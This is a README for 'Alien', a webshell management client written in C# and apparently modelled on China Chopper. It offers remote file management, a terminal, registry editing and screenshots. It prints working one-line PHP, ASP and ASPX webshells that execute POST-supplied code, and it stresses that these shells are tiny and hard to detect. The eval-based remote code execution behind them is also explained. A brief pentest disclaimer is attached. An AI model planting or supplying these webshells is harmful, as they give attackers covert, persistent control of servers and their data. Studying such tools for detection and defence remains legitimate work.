# Alien

Website Manager

## Disclaimer
This tool only use in legal pentest, reasearch and website management\
You should take the consequence if you use in illegal purpose.

## Language
C# .NET Framework V4.8

## Function
- FileManager(Can display image file, search file)
- Virtual Terminal
- System Information
- Database Management
- RegEdit
- Monitor
- Screenshot

## OneShell
OneShell is a tool use in pentesting for control the server.\
It can be very tiny and very difficult to be found.
These are the simplest oneshell.

- PHP
```<?php @eval($_POST['password']);?>```
- ASP
```<%execute(request("password"))%>```
- ASPX
```<%@ Page Language="Jscript"%><%eval(Request.Item["password"])%>```
Also, Alien support asmx , ashx webshell

## JSP webshell
Original chopper jsp shell, but some addition.\
it can display image

## NodeJS webshell
Differenti to php, asp, aspx, jsp...\
It is difficult to use in pentestation, but use in management.

## Server Manager
- MySQL : PHP
- Access : https://github.com/malbuffer4pt/DBer
- SQL Server : ASP ASPX ASMX ASHX

## Principle
For PHP, eval() function can evaluate the string as a code.\
if eval() contains a controllable variable, then we can execute any code we like.\
Example: eval($_POST['a']);\
HTTP POST a=phpinfo();\
The the server will execute code "phpinfo();"

## Screenshot
![5](https://github.com/malbuffer4pt/Alien/blob/main/5.png)
![1](https://github.com/malbuffer4pt/Alien/blob/main/1.png)
![6](https://github.com/malbuffer4pt/Alien/blob/main/6.png)
![2](https://github.com/malbuffer4pt/Alien/blob/main/2.png)
![3](https://github.com/malbuffer4pt/Alien/blob/main/3.png)
![4](https://github.com/malbuffer4pt/Alien/blob/main/4.png)

## Acknowledgements
Every veteran who study in webshell.
